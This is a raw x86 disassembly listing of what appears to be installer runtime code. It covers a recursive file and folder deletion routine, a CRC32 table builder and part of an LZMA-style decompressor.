  406515:	ff 74 24 08          	push   0x8(%esp)
  406519:	ff 74 24 08          	push   0x8(%esp)
  40651d:	e8 0d fe ff ff       	call   0x40632f
  406522:	59                   	pop    %ecx
  406523:	59                   	pop    %ecx
  406524:	ff 05 50 06 47 00    	incl   0x470650
  40652a:	c2 08 00             	ret    $0x8
  40652d:	55                   	push   %ebp
  40652e:	8b ec                	mov    %esp,%ebp
  406530:	81 ec 5c 02 00 00    	sub    $0x25c,%esp
  406536:	53                   	push   %ebx
  406537:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40653a:	53                   	push   %ebx
  40653b:	e8 d6 fa ff ff       	call   0x406016
  406540:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406543:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406546:	f6 c1 08             	test   $0x8,%cl
  406549:	74 17                	je     0x406562
  40654b:	53                   	push   %ebx
  40654c:	ff 15 6c 81 40 00    	call   *0x40816c
  406552:	f7 d8                	neg    %eax
  406554:	1b c0                	sbb    %eax,%eax
  406556:	40                   	inc    %eax
  406557:	01 05 48 06 47 00    	add    %eax,0x470648
  40655d:	e9 a6 01 00 00       	jmp    0x406708
  406562:	89 4d 08             	mov    %ecx,0x8(%ebp)
  406565:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  406569:	56                   	push   %esi
  40656a:	74 11                	je     0x40657d
  40656c:	85 c0                	test   %eax,%eax
  40656e:	0f 84 3f 01 00 00    	je     0x4066b3
  406574:	f6 c1 02             	test   $0x2,%cl
  406577:	0f 84 36 01 00 00    	je     0x4066b3
  40657d:	57                   	push   %edi
  40657e:	53                   	push   %ebx
  40657f:	be f8 b8 45 00       	mov    $0x45b8f8,%esi
  406584:	56                   	push   %esi
  406585:	e8 02 f5 ff ff       	call   0x405a8c
  40658a:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40658e:	8b 3d e8 80 40 00    	mov    0x4080e8,%edi
  406594:	74 0a                	je     0x4065a0
  406596:	68 b4 89 40 00       	push   $0x4089b4
  40659b:	56                   	push   %esi
  40659c:	ff d7                	call   *%edi
  40659e:	eb 06                	jmp    0x4065a6
  4065a0:	53                   	push   %ebx
  4065a1:	e8 43 fa ff ff       	call   0x405fe9
  4065a6:	66 83 3b 00          	cmpw   $0x0,(%ebx)
  4065aa:	75 0a                	jne    0x4065b6
  4065ac:	66 83 3d f8 b8 45 00 	cmpw   $0x5c,0x45b8f8
  4065b3:	5c 
  4065b4:	75 08                	jne    0x4065be
  4065b6:	68 c8 82 40 00       	push   $0x4082c8
  4065bb:	53                   	push   %ebx
  4065bc:	ff d7                	call   *%edi
  4065be:	53                   	push   %ebx
  4065bf:	ff 15 70 81 40 00    	call   *0x408170
  4065c5:	8d 04 43             	lea    (%ebx,%eax,2),%eax
  4065c8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4065cb:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  4065d1:	50                   	push   %eax
  4065d2:	56                   	push   %esi
  4065d3:	ff 15 68 81 40 00    	call   *0x408168
  4065d9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4065dc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4065df:	0f 84 bd 00 00 00    	je     0x4066a2
  4065e5:	8d b5 d0 fd ff ff    	lea    -0x230(%ebp),%esi
  4065eb:	6a 3f                	push   $0x3f
  4065ed:	8b c6                	mov    %esi,%eax
  4065ef:	50                   	push   %eax
  4065f0:	e8 92 f1 ff ff       	call   0x405787
  4065f5:	33 ff                	xor    %edi,%edi
  4065f7:	66 39 38             	cmp    %di,(%eax)
  4065fa:	74 09                	je     0x406605
  4065fc:	66 39 7d d8          	cmp    %di,-0x28(%ebp)
  406600:	74 03                	je     0x406605
  406602:	8d 75 d8             	lea    -0x28(%ebp),%esi
  406605:	66 83 3e 2e          	cmpw   $0x2e,(%esi)
  406609:	75 15                	jne    0x406620
  40660b:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  40660f:	66 3b c7             	cmp    %di,%ax
  406612:	74 6b                	je     0x40667f
  406614:	66 83 f8 2e          	cmp    $0x2e,%ax
  406618:	75 06                	jne    0x406620
  40661a:	66 39 7e 04          	cmp    %di,0x4(%esi)
  40661e:	74 5f                	je     0x40667f
  406620:	56                   	push   %esi
  406621:	ff 75 fc             	push   -0x4(%ebp)
  406624:	e8 63 f4 ff ff       	call   0x405a8c
  406629:	f6 85 a4 fd ff ff 10 	testb  $0x10,-0x25c(%ebp)
  406630:	74 15                	je     0x406647
  406632:	8b 45 0c             	mov    0xc(%ebp),%eax
  406635:	83 e0 03             	and    $0x3,%eax
  406638:	3c 03                	cmp    $0x3,%al
  40663a:	75 43                	jne    0x40667f
  40663c:	ff 75 0c             	push   0xc(%ebp)
  40663f:	53                   	push   %ebx
  406640:	e8 e8 fe ff ff       	call   0x40652d
  406645:	eb 38                	jmp    0x40667f
  406647:	53                   	push   %ebx
  406648:	e8 65 f2 ff ff       	call   0x4058b2
  40664d:	53                   	push   %ebx
  40664e:	ff 15 6c 81 40 00    	call   *0x40816c
  406654:	85 c0                	test   %eax,%eax
  406656:	75 1f                	jne    0x406677
  406658:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  40665c:	74 11                	je     0x40666f
  40665e:	53                   	push   %ebx
  40665f:	6a f1                	push   $0xfffffff1
  406661:	e8 e1 e3 ff ff       	call   0x404a47
  406666:	57                   	push   %edi
  406667:	53                   	push   %ebx
  406668:	e8 8d fe ff ff       	call   0x4064fa
  40666d:	eb 10                	jmp    0x40667f
  40666f:	ff 05 48 06 47 00    	incl   0x470648
  406675:	eb 08                	jmp    0x40667f
  406677:	53                   	push   %ebx
  406678:	6a f2                	push   $0xfffffff2
  40667a:	e8 c8 e3 ff ff       	call   0x404a47
  40667f:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  406685:	50                   	push   %eax
  406686:	ff 75 f8             	push   -0x8(%ebp)
  406689:	ff 15 64 81 40 00    	call   *0x408164
  40668f:	85 c0                	test   %eax,%eax
  406691:	0f 85 4e ff ff ff    	jne    0x4065e5
  406697:	ff 75 f8             	push   -0x8(%ebp)
  40669a:	ff 15 60 81 40 00    	call   *0x408160
  4066a0:	eb 02                	jmp    0x4066a4
  4066a2:	33 ff                	xor    %edi,%edi
  4066a4:	39 7d 08             	cmp    %edi,0x8(%ebp)
  4066a7:	5f                   	pop    %edi
  4066a8:	74 09                	je     0x4066b3
  4066aa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4066ad:	33 c0                	xor    %eax,%eax
  4066af:	66 89 41 fe          	mov    %ax,-0x2(%ecx)
  4066b3:	33 f6                	xor    %esi,%esi
  4066b5:	39 75 08             	cmp    %esi,0x8(%ebp)
  4066b8:	74 4d                	je     0x406707
  4066ba:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  4066bd:	74 38                	je     0x4066f7
  4066bf:	53                   	push   %ebx
  4066c0:	e8 a7 f4 ff ff       	call   0x405b6c
  4066c5:	85 c0                	test   %eax,%eax
  4066c7:	74 3e                	je     0x406707
  4066c9:	53                   	push   %ebx
  4066ca:	e8 eb f8 ff ff       	call   0x405fba
  4066cf:	53                   	push   %ebx
  4066d0:	e8 dd f1 ff ff       	call   0x4058b2
  4066d5:	53                   	push   %ebx
  4066d6:	ff 15 10 81 40 00    	call   *0x408110
  4066dc:	85 c0                	test   %eax,%eax
  4066de:	75 1f                	jne    0x4066ff
  4066e0:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  4066e4:	74 11                	je     0x4066f7
  4066e6:	53                   	push   %ebx
  4066e7:	6a f1                	push   $0xfffffff1
  4066e9:	e8 59 e3 ff ff       	call   0x404a47
  4066ee:	56                   	push   %esi
  4066ef:	53                   	push   %ebx
  4066f0:	e8 05 fe ff ff       	call   0x4064fa
  4066f5:	eb 10                	jmp    0x406707
  4066f7:	ff 05 48 06 47 00    	incl   0x470648
  4066fd:	eb 08                	jmp    0x406707
  4066ff:	53                   	push   %ebx
  406700:	6a e5                	push   $0xffffffe5
  406702:	e8 40 e3 ff ff       	call   0x404a47
  406707:	5e                   	pop    %esi
  406708:	5b                   	pop    %ebx
  406709:	c9                   	leave
  40670a:	c2 08 00             	ret    $0x8
  40670d:	55                   	push   %ebp
  40670e:	8b ec                	mov    %esp,%ebp
  406710:	83 3d 04 01 46 00 00 	cmpl   $0x0,0x460104
  406717:	75 32                	jne    0x40674b
  406719:	33 c9                	xor    %ecx,%ecx
  40671b:	56                   	push   %esi
  40671c:	6a 08                	push   $0x8
  40671e:	8b c1                	mov    %ecx,%eax
  406720:	5e                   	pop    %esi
  406721:	8b d0                	mov    %eax,%edx
  406723:	80 e2 01             	and    $0x1,%dl
  406726:	0f b6 d2             	movzbl %dl,%edx
  406729:	f7 da                	neg    %edx
  40672b:	1b d2                	sbb    %edx,%edx
  40672d:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406733:	d1 e8                	shr    $1,%eax
  406735:	33 c2                	xor    %edx,%eax
  406737:	4e                   	dec    %esi
  406738:	75 e7                	jne    0x406721
  40673a:	89 04 8d 00 01 46 00 	mov    %eax,0x460100(,%ecx,4)
  406741:	41                   	inc    %ecx
  406742:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406748:	7c d2                	jl     0x40671c
  40674a:	5e                   	pop    %esi
  40674b:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40674f:	8b 45 08             	mov    0x8(%ebp),%eax
  406752:	f7 d0                	not    %eax
  406754:	76 22                	jbe    0x406778
  406756:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406759:	0f b6 11             	movzbl (%ecx),%edx
  40675c:	ff 4d 10             	decl   0x10(%ebp)
  40675f:	33 d0                	xor    %eax,%edx
  406761:	81 e2 ff 00 00 00    	and    $0xff,%edx
  406767:	c1 e8 08             	shr    $0x8,%eax
  40676a:	33 04 95 00 01 46 00 	xor    0x460100(,%edx,4),%eax
  406771:	41                   	inc    %ecx
  406772:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406776:	77 e1                	ja     0x406759
  406778:	f7 d0                	not    %eax
  40677a:	5d                   	pop    %ebp
  40677b:	c2 0c 00             	ret    $0xc
  40677e:	b8 80 00 00 00       	mov    $0x80,%eax
  406783:	48                   	dec    %eax
  406784:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  406788:	75 f9                	jne    0x406783
  40678a:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  40678e:	33 c0                	xor    %eax,%eax
  406790:	40                   	inc    %eax
  406791:	89 41 68             	mov    %eax,0x68(%ecx)
  406794:	89 41 64             	mov    %eax,0x64(%ecx)
  406797:	89 41 60             	mov    %eax,0x60(%ecx)
  40679a:	89 41 5c             	mov    %eax,0x5c(%ecx)
  40679d:	c3                   	ret
  40679e:	55                   	push   %ebp
  40679f:	8d 6c 24 88          	lea    -0x78(%esp),%ebp
  4067a3:	81 ec 90 00 00 00    	sub    $0x90,%esp
  4067a9:	56                   	push   %esi
  4067aa:	57                   	push   %edi
  4067ab:	8b f1                	mov    %ecx,%esi
  4067ad:	6a 22                	push   $0x22
  4067af:	59                   	pop    %ecx
  4067b0:	8d 7d f0             	lea    -0x10(%ebp),%edi
  4067b3:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4067b6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4067b8:	83 7d 48 ff          	cmpl   $0xffffffff,0x48(%ebp)
  4067bc:	75 08                	jne    0x4067c6
  4067be:	33 c0                	xor    %eax,%eax
  4067c0:	40                   	inc    %eax
  4067c1:	e9 bc 09 00 00       	jmp    0x407182
  4067c6:	8b 75 24             	mov    0x24(%ebp),%esi
  4067c9:	53                   	push   %ebx
  4067ca:	8b 5d 34             	mov    0x34(%ebp),%ebx
  4067cd:	8b 55 74             	mov    0x74(%ebp),%edx
  4067d0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4067d3:	83 f8 1c             	cmp    $0x1c,%eax
  4067d6:	0f 87 a2 09 00 00    	ja     0x40717e
  4067dc:	ff 24 85 8a 71 40 00 	jmp    *0x40718a(,%eax,4)
  4067e3:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4067e7:	0f 84 82 09 00 00    	je     0x40716f
  4067ed:	8b 45 08             	mov    0x8(%ebp),%eax
  4067f0:	ff 4d 0c             	decl   0xc(%ebp)
  4067f3:	8a 00                	mov    (%eax),%al
  4067f5:	ff 45 08             	incl   0x8(%ebp)
  4067f8:	3c e1                	cmp    $0xe1,%al
  4067fa:	0f 87 7e 09 00 00    	ja     0x40717e
  406800:	0f b6 c0             	movzbl %al,%eax
  406803:	99                   	cltd
  406804:	6a 2d                	push   $0x2d
  406806:	59                   	pop    %ecx
  406807:	f7 f9                	idiv   %ecx
  406809:	6a 09                	push   $0x9
  40680b:	59                   	pop    %ecx
  40680c:	8b f0                	mov    %eax,%esi
  40680e:	0f b6 c2             	movzbl %dl,%eax
  406811:	99                   	cltd
  406812:	f7 f9                	idiv   %ecx
  406814:	8b ce                	mov    %esi,%ecx
  406816:	0f b6 fa             	movzbl %dl,%edi
  406819:	33 d2                	xor    %edx,%edx
  40681b:	42                   	inc    %edx
  40681c:	d3 e2                	shl    %cl,%edx
  40681e:	8b c8                	mov    %eax,%ecx
  406820:	89 7d 3c             	mov    %edi,0x3c(%ebp)
  406823:	4a                   	dec    %edx
  406824:	89 55 5c             	mov    %edx,0x5c(%ebp)
  406827:	33 d2                	xor    %edx,%edx
  406829:	42                   	inc    %edx
  40682a:	d3 e2                	shl    %cl,%edx
  40682c:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  40682f:	be 00 03 00 00       	mov    $0x300,%esi
  406834:	d3 e6                	shl    %cl,%esi
  406836:	4a                   	dec    %edx
  406837:	89 55 60             	mov    %edx,0x60(%ebp)
  40683a:	81 c6 36 07 00 00    	add    $0x736,%esi
  406840:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  406843:	3b 7d 00             	cmp    0x0(%ebp),%edi
  406846:	74 26                	je     0x40686e
  406848:	83 7d 74 00          	cmpl   $0x0,0x74(%ebp)
  40684c:	74 09                	je     0x406857
  40684e:	ff 75 74             	push   0x74(%ebp)
  406851:	ff 15 2c 81 40 00    	call   *0x40812c
  406857:	57                   	push   %edi
  406858:	6a 40                	push   $0x40
  40685a:	ff 15 20 81 40 00    	call   *0x408120
  406860:	89 45 74             	mov    %eax,0x74(%ebp)
  406863:	85 c0                	test   %eax,%eax
  406865:	0f 84 13 09 00 00    	je     0x40717e
  40686b:	89 7d 00             	mov    %edi,0x0(%ebp)
  40686e:	85 f6                	test   %esi,%esi
  406870:	74 0f                	je     0x406881
  406872:	8b 4d 74             	mov    0x74(%ebp),%ecx
  406875:	4e                   	dec    %esi
  406876:	b8 00 04 00 00       	mov    $0x400,%eax
  40687b:	66 89 04 71          	mov    %ax,(%ecx,%esi,2)
  40687f:	75 f1                	jne    0x406872
  406881:	83 65 30 00          	andl   $0x0,0x30(%ebp)
  406885:	83 65 38 00          	andl   $0x0,0x38(%ebp)
  406889:	eb 24                	jmp    0x4068af
  40688b:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40688f:	0f 84 6a 08 00 00    	je     0x4070ff
  406895:	8b 45 08             	mov    0x8(%ebp),%eax
  406898:	8b 4d 30             	mov    0x30(%ebp),%ecx
  40689b:	0f b6 00             	movzbl (%eax),%eax
  40689e:	ff 4d 0c             	decl   0xc(%ebp)
  4068a1:	c1 e1 03             	shl    $0x3,%ecx
  4068a4:	d3 e0                	shl    %cl,%eax
  4068a6:	09 45 38             	or     %eax,0x38(%ebp)
  4068a9:	ff 45 08             	incl   0x8(%ebp)
  4068ac:	ff 45 30             	incl   0x30(%ebp)
  4068af:	83 7d 30 04          	cmpl   $0x4,0x30(%ebp)
  4068b3:	7c d6                	jl     0x40688b
  4068b5:	8b 45 38             	mov    0x38(%ebp),%eax
  4068b8:	3b 45 04             	cmp    0x4(%ebp),%eax
  4068bb:	74 28                	je     0x4068e5
  4068bd:	83 7d 70 00          	cmpl   $0x0,0x70(%ebp)
  4068c1:	89 45 04             	mov    %eax,0x4(%ebp)
  4068c4:	74 09                	je     0x4068cf
  4068c6:	ff 75 70             	push   0x70(%ebp)
  4068c9:	ff 15 2c 81 40 00    	call   *0x40812c
  4068cf:	ff 75 38             	push   0x38(%ebp)
  4068d2:	6a 40                	push   $0x40
  4068d4:	ff 15 20 81 40 00    	call   *0x408120
  4068da:	89 45 70             	mov    %eax,0x70(%ebp)
  4068dd:	85 c0                	test   %eax,%eax
  4068df:	0f 84 99 08 00 00    	je     0x40717e
  4068e5:	8b 45 70             	mov    0x70(%ebp),%eax
  4068e8:	8b 4d 04             	mov    0x4(%ebp),%ecx
  4068eb:	c6 44 08 ff 00       	movb   $0x0,-0x1(%eax,%ecx,1)
  4068f0:	c7 45 30 05 00 00 00 	movl   $0x5,0x30(%ebp)
  4068f7:	eb 21                	jmp    0x40691a
  4068f9:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4068fd:	0f 84 05 08 00 00    	je     0x407108
  406903:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406906:	8b 45 6c             	mov    0x6c(%ebp),%eax
  406909:	0f b6 09             	movzbl (%ecx),%ecx
  40690c:	ff 4d 0c             	decl   0xc(%ebp)
  40690f:	c1 e0 08             	shl    $0x8,%eax
  406912:	0b c1                	or     %ecx,%eax
  406914:	ff 45 08             	incl   0x8(%ebp)
  406917:	89 45 6c             	mov    %eax,0x6c(%ebp)
  40691a:	8b 45 30             	mov    0x30(%ebp),%eax
  40691d:	ff 4d 30             	decl   0x30(%ebp)
  406920:	85 c0                	test   %eax,%eax
  406922:	75 d5                	jne    0x4068f9
  406924:	8b 55 74             	mov    0x74(%ebp),%edx
  406927:	8b 45 18             	mov    0x18(%ebp),%eax
  40692a:	23 45 5c             	and    0x5c(%ebp),%eax
  40692d:	8b 4d 40             	mov    0x40(%ebp),%ecx
  406930:	c1 e1 04             	shl    $0x4,%ecx
  406933:	03 c8                	add    %eax,%ecx
  406935:	89 45 2c             	mov    %eax,0x2c(%ebp)
  406938:	8d 34 4a             	lea    (%edx,%ecx,2),%esi
  40693b:	c7 45 f4 06 00 00 00 	movl   $0x6,-0xc(%ebp)
  406942:	e9 33 06 00 00       	jmp    0x406f7a
  406947:	33 c0                	xor    %eax,%eax
  406949:	39 45 38             	cmp    %eax,0x38(%ebp)
  40694c:	75 6d                	jne    0x4069bb
  40694e:	0f b6 75 1c          	movzbl 0x1c(%ebp),%esi
  406952:	8b 7d 18             	mov    0x18(%ebp),%edi
  406955:	23 7d 60             	and    0x60(%ebp),%edi
  406958:	6a 08                	push   $0x8
  40695a:	59                   	pop    %ecx
  40695b:	2a 4d 3c             	sub    0x3c(%ebp),%cl
  40695e:	d3 ee                	shr    %cl,%esi
  406960:	8b 4d 3c             	mov    0x3c(%ebp),%ecx
  406963:	d3 e7                	shl    %cl,%edi
  406965:	03 f7                	add    %edi,%esi
  406967:	69 f6 00 06 00 00    	imul   $0x600,%esi,%esi
  40696d:	83 7d 40 04          	cmpl   $0x4,0x40(%ebp)
  406971:	8d 8c 16 6c 0e 00 00 	lea    0xe6c(%esi,%edx,1),%ecx
  406978:	89 4d 20             	mov    %ecx,0x20(%ebp)
  40697b:	7d 05                	jge    0x406982
  40697d:	89 45 40             	mov    %eax,0x40(%ebp)
  406980:	eb 10                	jmp    0x406992
  406982:	83 7d 40 0a          	cmpl   $0xa,0x40(%ebp)
  406986:	7d 06                	jge    0x40698e
  406988:	83 6d 40 03          	subl   $0x3,0x40(%ebp)
  40698c:	eb 04                	jmp    0x406992
  40698e:	83 6d 40 06          	subl   $0x6,0x40(%ebp)
  406992:	39 45 44             	cmp    %eax,0x44(%ebp)
  406995:	74 1c                	je     0x4069b3
  406997:	8b 45 64             	mov    0x64(%ebp),%eax
  40699a:	2b 45 4c             	sub    0x4c(%ebp),%eax
  40699d:	3b 45 04             	cmp    0x4(%ebp),%eax
  4069a0:	72 03                	jb     0x4069a5
  4069a2:	03 45 04             	add    0x4(%ebp),%eax
  4069a5:	8b 4d 70             	mov    0x70(%ebp),%ecx
  4069a8:	8a 04 08             	mov    (%eax,%ecx,1),%al
  4069ab:	33 db                	xor    %ebx,%ebx
  4069ad:	88 45 1d             	mov    %al,0x1d(%ebp)
  4069b0:	43                   	inc    %ebx
  4069b1:	eb 62                	jmp    0x406a15
  4069b3:	33 db                	xor    %ebx,%ebx
  4069b5:	43                   	inc    %ebx
  4069b6:	e9 c9 01 00 00       	jmp    0x406b84
  4069bb:	8b 45 40             	mov    0x40(%ebp),%eax
  4069be:	c7 45 44 01 00 00 00 	movl   $0x1,0x44(%ebp)
  4069c5:	8d b4 42 80 01 00 00 	lea    0x180(%edx,%eax,2),%esi
  4069cc:	c7 45 f4 07 00 00 00 	movl   $0x7,-0xc(%ebp)
  4069d3:	e9 a2 05 00 00       	jmp    0x406f7a
  4069d8:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4069dc:	0f 84 2f 07 00 00    	je     0x407111
  4069e2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4069e5:	8b 45 6c             	mov    0x6c(%ebp),%eax
  4069e8:	0f b6 09             	movzbl (%ecx),%ecx
  4069eb:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  4069ef:	ff 4d 0c             	decl   0xc(%ebp)
  4069f2:	c1 e0 08             	shl    $0x8,%eax
  4069f5:	0b c1                	or     %ecx,%eax
  4069f7:	ff 45 08             	incl   0x8(%ebp)
  4069fa:	89 45 6c             	mov    %eax,0x6c(%ebp)
  4069fd:	8b 45 38             	mov    0x38(%ebp),%eax
  406a00:	39 45 30             	cmp    %eax,0x30(%ebp)
  406a03:	0f 85 ae 00 00 00    	jne    0x406ab7
  406a09:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406a0f:	0f 8d 07 01 00 00    	jge    0x406b1c
  406a15:	0f b6 45 1d          	movzbl 0x1d(%ebp),%eax
  406a19:	d0 65 1d             	shlb   $1,0x1d(%ebp)
  406a1c:	8b 4d 20             	mov    0x20(%ebp),%ecx
  406a1f:	c1 e8 07             	shr    $0x7,%eax
  406a22:	89 45 30             	mov    %eax,0x30(%ebp)
  406a25:	40                   	inc    %eax
  406a26:	c1 e0 08             	shl    $0x8,%eax
  406a29:	03 c3                	add    %ebx,%eax
  406a2b:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406a2e:	0f b7 06             	movzwl (%esi),%eax
  406a31:	8b 4d 68             	mov    0x68(%ebp),%ecx
  406a34:	0f b7 d0             	movzwl %ax,%edx
  406a37:	c1 e9 0b             	shr    $0xb,%ecx
  406a3a:	0f af ca             	imul   %edx,%ecx
  406a3d:	89 75 24             	mov    %esi,0x24(%ebp)
  406a40:	39 4d 6c             	cmp    %ecx,0x6c(%ebp)
  406a43:	73 1a                	jae    0x406a5f
  406a45:	83 65 38 00          	andl   $0x0,0x38(%ebp)
  406a49:	89 4d 68             	mov    %ecx,0x68(%ebp)
  406a4c:	b9 00 08 00 00       	mov    $0x800,%ecx
  406a51:	2b ca                	sub    %edx,%ecx
  406a53:	c1 f9 05             	sar    $0x5,%ecx
  406a56:	03 c8                	add    %eax,%ecx
  406a58:	66 89 0e             	mov    %cx,(%esi)
  406a5b:	03 db                	add    %ebx,%ebx
  406a5d:	eb 1e                	jmp    0x406a7d
  406a5f:	29 4d 68             	sub    %ecx,0x68(%ebp)
  406a62:	29 4d 6c             	sub    %ecx,0x6c(%ebp)
  406a65:	66 8b c8             	mov    %ax,%cx
  406a68:	66 c1 e9 05          	shr    $0x5,%cx
  406a6c:	66 2b c1             	sub    %cx,%ax
  406a6f:	c7 45 38 01 00 00 00 	movl   $0x1,0x38(%ebp)
  406a76:	66 89 06             	mov    %ax,(%esi)
  406a79:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  406a7d:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  406a84:	89 5d 34             	mov    %ebx,0x34(%ebp)
  406a87:	0f 83 70 ff ff ff    	jae    0x4069fd
  406a8d:	e9 46 ff ff ff       	jmp    0x4069d8
  406a92:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406a96:	0f 84 7e 06 00 00    	je     0x40711a
  406a9c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406a9f:	8b 45 6c             	mov    0x6c(%ebp),%eax
  406aa2:	0f b6 09             	movzbl (%ecx),%ecx
  406aa5:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  406aa9:	ff 4d 0c             	decl   0xc(%ebp)
  406aac:	c1 e0 08             	shl    $0x8,%eax
  406aaf:	0b c1                	or     %ecx,%eax
  406ab1:	ff 45 08             	incl   0x8(%ebp)
  406ab4:	89 45 6c             	mov    %eax,0x6c(%ebp)
  406ab7:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406abd:	7d 5d                	jge    0x406b1c
  406abf:	8b 45 20             	mov    0x20(%ebp),%eax
  406ac2:	8b 4d 68             	mov    0x68(%ebp),%ecx
  406ac5:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406ac8:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406acb:	0f b7 06             	movzwl (%esi),%eax
  406ace:	0f b7 f8             	movzwl %ax,%edi
  406ad1:	c1 e9 0b             	shr    $0xb,%ecx
  406ad4:	0f af cf             	imul   %edi,%ecx
  406ad7:	89 75 24             	mov    %esi,0x24(%ebp)
  406ada:	39 4d 6c             	cmp    %ecx,0x6c(%ebp)
  406add:	73 16                	jae    0x406af5
  406adf:	89 4d 68             	mov    %ecx,0x68(%ebp)
  406ae2:	b9 00 08 00 00       	mov    $0x800,%ecx
  406ae7:	2b cf                	sub    %edi,%ecx
  406ae9:	c1 f9 05             	sar    $0x5,%ecx
  406aec:	03 c8                	add    %eax,%ecx
  406aee:	66 89 0e             	mov    %cx,(%esi)
  406af1:	03 db                	add    %ebx,%ebx
  406af3:	eb 16                	jmp    0x406b0b
  406af5:	29 4d 68             	sub    %ecx,0x68(%ebp)
  406af8:	29 4d 6c             	sub    %ecx,0x6c(%ebp)
  406afb:	66 8b c8             	mov    %ax,%cx
  406afe:	66 c1 e9 05          	shr    $0x5,%cx
  406b02:	66 2b c1             	sub    %cx,%ax
  406b05:	66 89 06             	mov    %ax,(%esi)
  406b08:	8d 5a 01             	lea    0x1(%edx),%ebx
  406b0b:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  406b12:	89 5d 34             	mov    %ebx,0x34(%ebp)
  406b15:	73 a0                	jae    0x406ab7
  406b17:	e9 76 ff ff ff       	jmp    0x406a92
  406b1c:	83 65 44 00          	andl   $0x0,0x44(%ebp)
  406b20:	8a 45 34             	mov    0x34(%ebp),%al
  406b23:	88 45 1c             	mov    %al,0x1c(%ebp)
  406b26:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  406b2a:	0f 84 fc 05 00 00    	je     0x40712c
  406b30:	8a 45 1c             	mov    0x1c(%ebp),%al
  406b33:	8b 4d 10             	mov    0x10(%ebp),%ecx
  406b36:	8b 55 70             	mov    0x70(%ebp),%edx
  406b39:	ff 45 18             	incl   0x18(%ebp)
  406b3c:	ff 45 10             	incl   0x10(%ebp)
  406b3f:	ff 4d 14             	decl   0x14(%ebp)
  406b42:	88 01                	mov    %al,(%ecx)
  406b44:	8b 4d 64             	mov    0x64(%ebp),%ecx
  406b47:	88 04 11             	mov    %al,(%ecx,%edx,1)
  406b4a:	8d 41 01             	lea    0x1(%ecx),%eax
  406b4d:	33 d2                	xor    %edx,%edx
  406b4f:	f7 75 04             	divl   0x4(%ebp)
  406b52:	e9 7d 01 00 00       	jmp    0x406cd4
  406b57:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406b5b:	0f 84 c2 05 00 00    	je     0x407123
  406b61:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406b64:	8b 45 6c             	mov    0x6c(%ebp),%eax
  406b67:	0f b6 09             	movzbl (%ecx),%ecx
  406b6a:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  406b6e:	ff 4d 0c             	decl   0xc(%ebp)
  406b71:	c1 e0 08             	shl    $0x8,%eax
  406b74:	0b c1                	or     %ecx,%eax
  406b76:	ff 45 08             	incl   0x8(%ebp)
  406b79:	89 45 6c             	mov    %eax,0x6c(%ebp)
  406b7c:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406b82:	7d 9c                	jge    0x406b20
  406b84:	8b 45 20             	mov    0x20(%ebp),%eax
  406b87:	8b 4d 68             	mov    0x68(%ebp),%ecx
  406b8a:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406b8d:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406b90:	0f b7 06             	movzwl (%esi),%eax
  406b93:	0f b7 f8             	movzwl %ax,%edi
  406b96:	c1 e9 0b             	shr    $0xb,%ecx
  406b99:	0f af cf             	imul   %edi,%ecx
  406b9c:	89 75 24             	mov    %esi,0x24(%ebp)
  406b9f:	39 4d 6c             	cmp    %ecx,0x6c(%ebp)
  406ba2:	73 16                	jae    0x406bba
  406ba4:	89 4d 68             	mov    %ecx,0x68(%ebp)
  406ba7:	b9 00 08 00 00       	mov    $0x800,%ecx
  406bac:	2b cf                	sub    %edi,%ecx
  406bae:	c1 f9 05             	sar    $0x5,%ecx
  406bb1:	03 c8                	add    %eax,%ecx
  406bb3:	66 89 0e             	mov    %cx,(%esi)
  406bb6:	03 db                	add    %ebx,%ebx
  406bb8:	eb 16                	jmp    0x406bd0
